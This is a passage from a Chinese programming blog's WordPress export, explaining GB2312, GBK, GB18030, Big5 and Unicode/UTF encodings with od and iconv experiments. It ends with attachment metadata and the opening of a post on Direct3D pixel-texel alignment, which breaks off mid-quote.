<strong>内码</strong>：由于文本中通常混合使用汉字和西文字符，汉字信息如果不予以特别标识，就会与单字节的ASCII码混淆。此问题的解决方法之一是将一个汉字看成是两个扩展ASCII码，使表示GB2312汉字的两个字节的最高位都为1。即国标码加上128（即二进制数10000000,16进制80H）这种高位为1的双字节汉字编码即为GB2312汉字的机内码，简称为内码。20H+80H=A0H。这也就是常说的在区位码的区号和位号上分别加上A0H就得到了GB2312编码的由来。

00110001 00000111
+ 10100000 10100000
-------------------
11010001 10100111
用十六进制数表示即为D1A7H。

<strong>外码</strong>：机外码的简称,就是汉字输入码，是为了通过键盘字符把汉字输入计算机而设计的一种编码。 英文输入时，相输入什么字符便按什么键，外码和内码一致。汉字输入时，可能要按几个键才能输入一个汉字。 汉字输入方案有成百上千个，但是这千差万别的外码输入进计算机后都会转换成统一的内码。
最后总结一下上面的概念。中国国家标准总局把中文常用字符编码为94个区，每个区对应94个位，每个字符的区号和位号组合起来就是该字符的区位码, 区位码用10进制数来表示，如4907就表示49区7位，对应的字符是“学”。 由于区位码的取值范围与通信使用的控制码（00H~1FH）（即0~31）发生冲突。每个汉字的区号和位号分别加上32（即16进制20H）得到国标码，交换码。“学”的国标码为5127H。由于文本中通常混合使用汉字和西文字符，为了让汉字信息不会与单字节的ASCII码混淆，将一个汉字看成是两个扩展ASCII码，即汉字的两个字节的最高位置为1，得到的编码为GB2312汉字的内码。“学”的内码为D1A7H。无论你使用什么输入法，通过什么样的按键组合把“学”输入计算机，“学”在使用GB2312（以及兼容GB2312）编码的计算机里的内码都是D1A7H。

<strong>第二次尝试：GBK</strong>
GB2312的出现基本满足了汉字的计算机处理需要，但由于上面提到未收录繁体字和生僻字，从而不能处理人名、古汉语等方面出现的罕用字，这导致了1995年《汉字编码扩展规范》（GBK）的出现。GBK编码是GB2312编码的超集，向下完全兼容GB2312，兼容的含义是不仅字符兼容，而且相同字符的编码也相同，

<strong>中文二进制存储</strong>
同时在字汇一级支持ISO/IEC10646—1和GB 13000—1的全部中、日、韩（CJK）汉字，共计20902字。GBK还收录了GB2312不包含的汉字部首符号、竖排标点符号等字符。CP936和GBK的有些许差别，绝大多数情况下可以把CP936当作GBK的别名。

<strong>第三次尝试：GB18030</strong>
GB18030编码向下兼容GBK和GB2312。GB18030收录了所有Unicode3.1中的字符，包括中国少数民族字符，GBK不支持的韩文字符等等，也可以说是世界大多民族的文字符号都被收录在内。GBK和GB2312都是双字节等宽编码，如果算上和ASCII兼容所支持的单字节，也可以理解为是单字节和双字节混合的变长编码。GB18030编码是变长编码，有单字节、双字节和四字节三种方式。

其实，这三个标准并不需要死记硬背，只需要了解是根据应用需求不断扩展编码范围即可。从GB2312到GBK再到GB18030收录的字符越来越多即可。万幸的是一直是向下兼容的，也就是说一个汉字在这三个编码标准里的编码是一模一样的。这些编码的共性是变长编码，单字节ASCII兼容，对其他字符GB2312和GBK都使用双字节等宽编码，只有GB18030还有四字节编码的方式。这些编码最大的问题是2个。1.由于低字节的编码范围和ASCII有重合，所以不能根据一个字节的内容判断是中文的一部分还是一个独立的英文字符。2.如果有两个汉字编码为A1A2B1B2，存在A2B1也是一个有效汉字编码的特殊情况。这样就不能直接使用标准的字符串匹配函数来判断一个字符串里是否包含某一个汉字，而需要先判断字符边界然后才能进行字符匹配判断。

最后，提一个小插曲，上面讲的都是大陆推行的汉字编码标准，使用繁体的中文社群中最常用的电脑汉字字符集标准叫大五码（Big5），共收录13,060个中文字，其中有二字为重覆编码(实在是不应该)。Big5虽普及于中国的台湾、香港与澳门等繁体中文通行区，但长期以来并非当地的国家标准，而只是业界标准。倚天中文系统、Windows等主要系统的字符集都是以Big5为基准，但厂商又各自增删，衍生成多种不同版本。2003年，Big5被收录到台湾官方标准的附录当中，取得了较正式的地位。这个最新版本被称为Big5-2003。

<strong>天下归一Unicode</strong>
看了上面的多个中文编码是不是有点头晕了呢？如果把这个问题放到全世界n多个国家n多语种呢？各国和各地区自己的文字编码规则互相冲突的情况全球信息<a href="http://www.edenw.com/tech/net/switch/" target="_blank">交换</a>带来了很大的麻烦。

要真正彻底解决这个问题，上面介绍的那些通过扩展ASCII修修补补的方式已经走不通了，而必须有一个全新的编码系统，这个系统要可以将中文、日文、法文、德文……等等所有的文字统一起来考虑，为每一个文字都分配一个单独的编码。于是，Unicode诞生了。Unicode（统一码、万国码、单一码）为地球上（以后会包括火星，金星，喵星等）每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。在Unicode里，所有的字符被一视同仁，汉字不再使用“两个扩展ASCII”，而是使用“1个Unicode”来表示，也就是说，所有的文字都按一个字符来处理，它们都有一个唯一的Unicode码。Unicode用数字0-0x10FFFF来映射这些字符，最多可以容纳1114112个字符，或者说有1114112个码位（码位就是可以分配给字符的数字）。

提到Unicode不能不提UCS（通用字符集Universal Character Set）。UCS是由ISO制定的ISO 10646（或称ISO/IEC 10646）标准所定义的标准字符集。UCS-2用两个字节编码，UCS-4用4个字节编码。Unicode是由unicode.org制定的编码机制，ISO与unicode.org是两个不同的组织, 虽然最初制定了不同的标准; 但目标是一致的。所以自从unicode2.0开始, unicode采用了与ISO 10646-1相同的字库和字码, ISO也承诺ISO10646将不会给超出0x10FFFF的UCS-4编码赋值, 使得两者保持一致。大家简单认为UCS等同于Unicode就可以了。

在Unicode中：汉字“字”对应的数字是23383。在Unicode中，我们有很多方式将数字23383表示成程序中的数据，包括：UTF-8、UTF-16、UTF-32。UTF是“UCS Transformation Format”的缩写，可以翻译成Unicode字符集转换格式，即怎样将Unicode定义的数字转换成程序数据。例如，“汉字”对应的数字是0x6c49和0x5b57，而编码的程序数据是：
<div>
<div id="highlighter_348725">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td>
<div>
<div><code>BYTE data_utf8[] = {0xE6, 0xB1, 0x89, 0xE5, 0xAD, 0x97}; // UTF-8编码</code></div>
<div><code>WORD data_utf16[] = {0x6c49, 0x5b57}; // UTF-16编码</code></div>
<div><code>DWORD data_utf32[] = {0x6c49, 0x5b57}; // UTF-32编码</code></div>
</div></td>
</tr>
</tbody>
</table>
</div>
</div>
这里用BYTE、WORD、DWORD分别表示无符号8位整数，无符号16位整数和无符号32位整数。UTF-8、UTF-16、UTF-32分别以BYTE、WORD、DWORD作为编码单位。“汉字”的UTF-8编码需要6个字节。“汉字”的UTF-16编码需要两个WORD，大小是4个字节。“汉字”的UTF-32编码需要两个DWORD，大小是8个字节。根据字节序的不同，UTF-16可以被实现为UTF-16LE或UTF-16BE，UTF-32可以被实现为UTF-32LE或UTF-32BE。

下面介绍UTF-8、UTF-16、UTF-32、BOM。

<strong><em>UTF-8</em></strong>

UTF-8以字节为单位对Unicode进行编码。从Unicode到UTF-8的编码方式如下：
<table border="1">
<tbody>
<tr>
<td>Unicode编码(16进制)</td>
<td>UTF-8 字节流(二进制)</td>
</tr>
<tr>
<td>000000 – 00007F</td>
<td>0xxxxxxx</td>
</tr>
<tr>
<td>000080 – 0007FF</td>
<td>110xxxxx 10xxxxxx</td>
</tr>
<tr>
<td>000800 – 00FFFF</td>
<td>1110xxxx 10xxxxxx 10xxxxxx</td>
</tr>
<tr>
<td>010000 – 10FFFF</td>
<td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td>
</tr>
</tbody>
</table>
UTF-8的特点是对不同范围的字符使用不同长度的编码。对于0×00-0x7F之间的字符，UTF-8编码与ASCII编码完全相同。UTF-8编码的最大长度是4个字节。从上表可以看出，4字节模板有21个x，即可以容纳21位二进制数字。Unicode的最大码位0x10FFFF也只有21位。总结了一下规律：UTF-8的第一个字节开始的1的个数代表了总的编码字节数，后续字节都是以10开始。由上面的规则可以清晰的看出UTF-8编码克服了中文编码的两个问题。

例1：“汉”字的Unicode编码是0x6C49。0x6C49在0×0800-0xFFFF之间，使用3字节模板了：1110xxxx 10xxxxxx 10xxxxxx。将0x6C49写成二进制是：0110 1100 0100 1001， 用这个比特流依次代替模板中的x，得到：11100110 10110001 10001001，即E6 B1 89。

例2：Unicode编码0x20C30在0×010000-0x10FFFF之间，使用用4字节模板了：11110xxx 10xxxxxx 10xxxxxx 10xxxxxx。将0x20C30写成21位二进制数字（不足21位就在前面补0）：0 0010 0000 1100 0011 0000，用这个比特流依次代替模板中的x，得到：11110000 10100000 10110000 10110000，即F0 A0 B0 B0。

<strong><em>UTF-16</em></strong>

UTF-16编码以16位无符号整数为单位。我们把Unicode编码记作U。编码规则如下：　　如果U&lt;0×10000，U的UTF-16编码就是U对应的16位无符号整数（为书写简便，下文将16位无符号整数记作WORD）。中文范围 4E00-9FBF，所以在UTF-16编码里中文2个字节编码。如果U≥0×10000，我们先计算U’=U-0×10000，然后将U’写成二进制形式：yyyy yyyy yyxx xxxx xxxx，U的UTF-16编码（二进制）就是：110110yyyyyyyyyy 110111xxxxxxxxxx。

<strong><em>UTF-32</em></strong>

UTF-32编码以32位无符号整数为单位。Unicode的UTF-32编码就是其对应的32位无符号整数

<strong><em>字节序</em></strong>

根据字节序(对字节序不太了解的同学请参考<a href="http://en.wikipedia.org/wiki/Endianness">http://en.wikipedia.org/wiki/Endianness</a>)的不同，UTF-16可以被实现为UTF-16LE（Little Endian）或UTF-16BE（Big Endian），UTF-32可以被实现为UTF-32LE或UTF-32BE。例如：
<table border="1">
<tbody>
<tr>
<td>Unicode编码</td>
<td>UTF-16LE</td>
<td>UTF-16BE</td>
<td>UTF-32LE</td>
<td>UTF-32BE</td>
</tr>
<tr>
<td>0x006C49</td>
<td>49 6C</td>
<td>6C 49</td>
<td>49 6C 00 00</td>
<td>00 00 6C 49</td>
</tr>
<tr>
<td>0x020C30</td>
<td>43 D8 30 DC</td>
<td>D8 43 DC 30</td>
<td>30 0C 02 00</td>
<td>00 02 0C 30</td>
</tr>
</tbody>
</table>
那么，怎么判断字节流的字节序呢？Unicode标准建议用BOM（Byte Order Mark）来区分字节序，即在传输字节流前，先传输被作为BOM的字符”零宽无中断空格”。这个字符的编码是FEFF，而反过来的FFFE（UTF-16）和FFFE0000（UTF-32）在Unicode中都是未定义的码位，不应该出现在实际传输中。下表是各种UTF编码的BOM：
<table border="1">
<tbody>
<tr>
<td>UTF编码</td>
<td>Byte Order Mark</td>
</tr>
<tr>
<td>UTF-8</td>
<td>EF BB BF</td>
</tr>
<tr>
<td>UTF-16LE</td>
<td>FF FE</td>
</tr>
<tr>
<td>UTF-16BE</td>
<td>FE FF</td>
</tr>
<tr>
<td>UTF-32LE</td>
<td>FF FE 00 00</td>
</tr>
<tr>
<td>UTF-32BE</td>
<td>00 00 FE FF</td>
</tr>
</tbody>
</table>
总结一下，ISO与unicode.org都敏锐的意识到只有为世界上每种语言中的每个字符设定统一并且唯一的二进制编码才能彻底解决计算机世界信息交流中编码冲突的问题。由此诞生了UCS和unicode，而这两个规范是一致的。在Unicode里，所有的字符被一视同仁，也就是说，所有的文字都按一个字符来处理，它们都有一个唯一的Unicode码。UTF-8、UTF-16、UTF-32分别定义了怎样将Unicode定义的数字转换成程序数据。UTF-8以字节为单位对Unicode进行编码，一个英文字符占1个字节，汉字占3个字节；UTF-16以16位无符号整数为单位对Unicode进行编码，中文英文都占2个字节；UTF-32以32位无符号整数为单位对Unicode进行编码，中文英文都占4个字节。可以在<a href="http://www.unicode.org/charts/unihan.html">http://www.unicode.org/charts/unihan.html</a> 查看汉字的unicode码以及UTF-8、UTF-16、UTF-32编码。

<strong>中文二进制存储</strong>
介绍了这么多的编码知识，真正的文件内容是什么样子的呢？下面我们就通过实验看看在笔者Linux机器上 “中文”这两个字在不同的编码下保存的文件内容。下面是我的实验过程，有兴趣的同学可以在自己的机器上重做一下。window平台上的情况类似这里就不赘述了。

实验需要需要使用2个工具：
<ol>
	<li>od 查看文件内容：<a href="http://www.gnu.org/software/coreutils/manual/html_node/od-invocation.html">http://www.gnu.org/software/coreutils/manual/html_node/od-invocation.html</a></li>
	<li>iconv 编码转换工具：http://www.gnu.org/software/libiconv/</li>
</ol>
<table border="1" cellspacing="0" cellpadding="0" width="636">
<tbody>
<tr>
<td width="75" valign="top">汉字</td>
<td width="90" valign="top">Unicode（ucs-2）10进制表示</td>
<td width="75" valign="top">Utf-8</td>
<td width="75" valign="top">Utf-16</td>
<td width="75" valign="top">Utf32</td>
<td width="75" valign="top">区位码</td>
<td width="90" valign="top">GB2312/GBK/GB18030</td>
</tr>
<tr>
<td width="75" valign="top">中</td>
<td width="90" valign="top">20013</td>
<td width="75" valign="top">E4 B8 AD</td>
<td width="75" valign="top">4E2D</td>
<td width="75" valign="top">00004E2D</td>
<td width="75" valign="top">5448</td>
<td width="90" valign="top">D6D0</td>
</tr>
<tr>
<td width="75" valign="top">文</td>
<td width="90" valign="top">25991</td>
<td width="75" valign="top">E6 96 87</td>
<td width="75" valign="top">6587</td>
<td width="75" valign="top">00006587</td>
<td width="75" valign="top">4636</td>
<td width="90" valign="top">CEC4</td>
</tr>
</tbody>
</table>
机器环境：
os: Red Hat Enterprise Linux AS release 4
Cpu: Intel(R) Xeon(R) CPU
locale：LC_ALL=zh_CN.utf-8
<div>
<div id="highlighter_529008">
<table border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td>
<div>
<div><code>//生成utf8编码下的文件</code></div>
<div><code>echo –n "中文" &gt; foo.utf8</code></div>
<div><code>//检查foo的内容：</code></div>
<div><code>od -t x1 foo.utf8</code></div>
<div><code>0000000 e4 b8 ad e6 96 87</code></div>
<div><code>//转换为utf16编码</code></div>
<div><code>iconv -f utf-8 -t utf-16 foo.utf8 &gt; foo.utf16</code></div>
<div><code>//查看foo.utf16内容</code></div>
<div><code>od -t x1 foo.utf16</code></div>
<div><code>0000000 ff fe 2d 4e 87 65</code></div>
<div><code>Ff fe是BOM（还记得吗？通过BOM来字节流的字节序），其余部分的确是UTF-16LE编码的内容</code></div>
<div><code>//转换为utf32编码</code></div>
<div><code>iconv -f utf-16 -t utf-32 foo.utf16 &gt; foo.utf32</code></div>
<div><code>//查看foo.utf32内容</code></div>
<div><code>od -t x1 foo.utf32</code></div>
<div><code>0000000 ff fe 00 00 2d 4e 00 00 87 65 00 00</code></div>
<div><code>Ff fe是BOM，的确是UTF-32LE编码的内容</code></div>
<div><code>//转换为gb2312编码</code></div>
<div><code>iconv -f utf-8 -t gb2312 foo.txt &gt; foo.gb2312</code></div>
<div><code>od -t x1 foo.gb2312</code></div>
<div><code>0000000 d6 d0 ce c4</code></div>
<div><code>//转换为GBK编码</code></div>
<div><code>iconv -f utf-8 -t gbk foo.txt &gt; foo.gbk</code></div>
<div><code>od -t x1 foo.gbk</code></div>
<div><code>0000000 d6 d0 ce c4</code></div>
<div><code>//转换为GB18030编码</code></div>
<div><code>iconv -f utf-8 -t gb18030 foo.txt &gt; foo.gb18030</code></div>
<div><code>od -t x1 foo.gb18030</code></div>
<div><code>0000000 d6 d0 ce c4</code></div>
</div></td>
</tr>
</tbody>
</table>
</div>
</div>
<strong>C语言中文处理</strong>
先明确一个概念：程序内部编码和程序外部编码。程序内部编码指的是中文字符在程序运行时在内存中的编码形式。程序外部编码则是中文字符在存储或者传输时的编码形式。程序外部编码的最直观的例子就是当把中文存储到硬盘文件中时选择的编码。

根据程序内部编码和程序外部编码是否一致，C/C++的中文处理有两种常见的方式：
<ol>
	<li>内外编码相同。输入输出时不需要考虑编码转换，程序内部处理时把中文字符当做普通的2进制数据流进行处理。</li>
	<li>内外编码不同。输入输出的时候根据应用需要选择合适的编码格式进行编码转换；程序内部统一编码处理。</li>
</ol>
方法1的优点不言而喻，由于内外统一，不需要进行转换。不足是如果不是C标准库支持的编码方式，那么字符串处理函数需要自己实现。比如说标准strlen函数不能计算中文编码&amp;UTF-8等的字符串长度，而需要根据编码标准自行实现。GBK等中文编码除了计算字符串长度的函数外，字符串匹配函数也要自己实现（原因看上文中文编码总结）。当需要支持的编码格式不断增多时，处理函数的开发和维护就需要付出更大的代价。

方法2针对方法1的不足加以改进。在程序内部可以优先选择C标准库支持的编码方式，或者根据需要自己实现对某一特定编码格式的完整支持，这样任何编码都可以先转换为支持的编码，代码通用性比较好。

那么C标准库对中文编码的支持如何呢？目前Linux平台一般使用GNU C library，内建了对单字节的char和宽字符wchar_t的支持。Char大家都很熟悉了，处理中文需要的wchar_t要重点介绍一下。从实现上来说在linux平台上可以认为wchar_t是4byte的int，内部存储字符的UTF32编码。由于标准库已经内建了对wchar_t比较完备的支持，如使用wcslen 计算字符串长度，使用wcscmp进行字符串比较等等。所以比较简单的方式是使用上面的方法2，同时选择wchar_t作为内部字符的表示。做到这一点还是比较容易的，在输入输出的时候通过mbrtowc/wcrtomb 进行单个字符的内外编码转换，以及通过mbsrtowcs/wcsrtombs 进行字符串的内外编码转换即可。这里需要注意两点：
<ol>
	<li>代码中字符串常量的表示不同。举例说明：Char c=’a’; Wchar_t wc=L’中’;</li>
	<li>上面两组函数的转换是依赖locale设置的，即locale决定了外部编码的类型。确切的说是LC_CTYPE决定了外部编码的类型。默认情况下程序启动时使用标准“C”locale，而不是LC系列的环境变量指定的。所以需要首先调用下面的函数：setlocale (LC_ALL, “”);这样程序就使用了用户通过设置LC系列环境变量选择的Locale。</li>
</ol>
关于locale的话题比较大，这里就不深入了，留待下一篇文章吧.

上面的方法很完美，是吗？不是吗？得到这么多的好处不是无代价的，最明显的代价就是内存，任何一个字符，不管中文还是英文如果保持在wchar_t里就需要4个byte，就这一个理由就足以限制了这个方案在关注内存使用的应用场景下的使用。

<strong>Python的中文处理</strong>
对Python来说由于内建unicde的支持，所以采用输入输出的时候进行转换，内部保持unicode的方式使用是个不错的方案。<a href="http://docs.python.org/tutorial/introduction.html#unicode-strings">http://docs.python.org/tutorial/introduction.html#unicode-strings</a>这里作为起点，有兴趣的同学自学吧。

<strong>编码选择建议：</strong>
<ol>
	<li>只有英文：毫不犹豫选择内外编码都选择ASCII，通用且存储代价小。</li>
	<li>主要存中文，对存储大小比较敏感：内外部编码根据文字使用范围选择GB2312或者GBK，自行实现使用到的字符串处理函数。</li>
	<li>通用性第一，处理简单：外部选择UTF-8，内部可以使用UTF-8或者UTF-32（即wchar_t）</li>
</ol>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>163</wp:post_id>
		<wp:post_date>2012-05-07 21:18:08</wp:post_date>
		<wp:post_date_gmt>2012-05-07 13:18:08</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e4%b8%ad%e6%96%87%e7%bc%96%e7%a0%81%e6%9d%82%e8%b0%88</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[8]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343358823]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>EthanonenEngine_sprite</title>
		<link>http://codemylife.blogcn.com/2012/07/pixel-texel-alignment/ethanonenengine_sprite/</link>
		<pubDate>Sun, 22 Jul 2012 12:00:21 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp01/M00/08/17/wKgKC1AL61UAAAAAAAAaSmYphyM604.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>166</wp:post_id>
		<wp:post_date>2012-07-22 20:00:21</wp:post_date>
		<wp:post_date_gmt>2012-07-22 12:00:21</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ethanonenengine_sprite</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>165</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp01/M00/08/17/wKgKC1AL61UAAAAAAAAaSmYphyM604.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"303";s:6:"height";s:2:"61";s:14:"hwstring_small";s:23:"height='25' width='128'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"61";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/05/CD/wKgKC1AL61UAAAAAAAAKnWdCzc4410.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:2:"37";s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/06/4F/wKgKClAL61UAAAAAAAALn02n7vw475.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/06/33/wKgKClAL61UAAAAAAAAaShyxBN4686.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>Pixel_texel_alignment</title>
		<link>http://codemylife.blogcn.com/2012/07/pixel-texel-alignment/pixel_texel_alignment/</link>
		<pubDate>Sun, 22 Jul 2012 12:42:44 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp05/M00/06/05/wKgKDVAL9UQAAAAAAAA7CGpm3U8091.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>167</wp:post_id>
		<wp:post_date>2012-07-22 20:42:44</wp:post_date>
		<wp:post_date_gmt>2012-07-22 12:42:44</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>pixel_texel_alignment</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>165</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp05/M00/06/05/wKgKDVAL9UQAAAAAAAA7CGpm3U8091.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"300";s:6:"height";s:3:"400";s:14:"hwstring_small";s:22:"height='96' width='72'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/08/91/wKgKDFAL9UQAAAAAAAAIAF5Nifc486.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"141";s:6:"height";s:3:"188";s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/06/4F/wKgKClAL9UQAAAAAAAAR-lXqrnM825.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/06/33/wKgKClAL9UQAAAAAAAA7CD3jqzw825.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>hodgman_pic</title>
		<link>http://codemylife.blogcn.com/2012/07/pixel-texel-alignment/hodgman_pic/</link>
		<pubDate>Sun, 22 Jul 2012 12:49:40 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp01/M00/04/33/wKgKClAL9uQAAAAAAAAniE3Ujhc309.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>168</wp:post_id>
		<wp:post_date>2012-07-22 20:49:40</wp:post_date>
		<wp:post_date_gmt>2012-07-22 12:49:40</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>hodgman_pic</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>165</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp01/M00/04/33/wKgKClAL9uQAAAAAAAAniE3Ujhc309.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"392";s:6:"height";s:3:"168";s:14:"hwstring_small";s:23:"height='54' width='128'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/06/33/wKgKClAL9uQAAAAAAAAG2UJQJUw017.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:2:"80";s:3:"url";s:73:"http://files.blogcn.com/wp03/M00/05/C8/wKgKC1AL9uQAAAAAAAAMS3r7zbo705.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/05/CD/wKgKC1AL9uQAAAAAAAAniHEtrng415.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>Pixel texel alignment</title>
		<link>http://codemylife.blogcn.com/2012/07/pixel-texel-alignment/</link>
		<pubDate>Sun, 22 Jul 2012 12:54:47 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[DirectX]]></category>

		<category domain="category" nicename="directx"><![CDATA[DirectX]]></category>

		<category domain="tag"><![CDATA[DirectX]]></category>

		<category domain="tag" nicename="directx"><![CDATA[DirectX]]></category>

		<category><![CDATA[技术]]></category>

		<category domain="category" nicename="%e6%8a%80%e6%9c%af"><![CDATA[技术]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=165</guid>
		<description></description>
		<content:encoded><![CDATA[不吃饭则饥，不读书则愚。

曾经在看客户端的代码时，发现最终在填充顶点坐标时，都会减去一个值0.5。今天看一个2D引擎代码的时候，也发现了如下注释：
<img src="http://files.blogcn.com/wp01/M00/08/17/wKgKC1AL61UAAAAAAAAaSmYphyM604.jpg" alt="" />
于是查了一些资料，关于这个值0.5：

一些定义：
<strong>Pixel</strong>：A pixel is generally thought of as the smallest single component of a digital image. also is the single smallest point addressable on your screen.

<strong>Texel</strong>：A texel, or texture element (also texture pixel) is the fundamental unit of texture space, used in computer graphics. Textures are represented by arrays of texels, just as pictures are represented by arrays of pixels.

<strong>Voxel</strong>：A voxel represents a single sample, or data point, on a regularly spaced, three dimensional grid.

<strong>一些解释：</strong>
<strong>1、来自 Ogre Wiki:</strong><a href="http://www.ogre3d.org/tikiwiki/tiki-index.php?page=-Pixel%20texel%20alignment">Pixel texel alignment </a>.
<img src="http://files.blogcn.com/wp05/M00/06/05/wKgKDVAL9UQAAAAAAAA7CGpm3U8091.jpg" alt="" />
D3D pixels different from D3D9 texels in that pixels have whole values at the centers, but texels have whole values at the corners. Therefore, <strong>if you do any 2D rendering that needs 1:1 pixel-texel alignment, you need to subtract 0.5 pixels from the pixel position or add 0.5 to the texel position</strong> (of course, if your texture values are in [0..1] range, you'll need to divide 0.5 by width and/or height). This is not an issue under OpenGL because both OpenGL pixels *and* texels have whole values at the centers, so no alignment is necessary.

<strong>2、来自gamedev.net：</strong><a href="http://www.gamedev.net/topic/627348-pixeltexel-offset-problem-deferred-composition/">Pixel/Texel offset problem (deferred composition)</a>
Hodgman says:

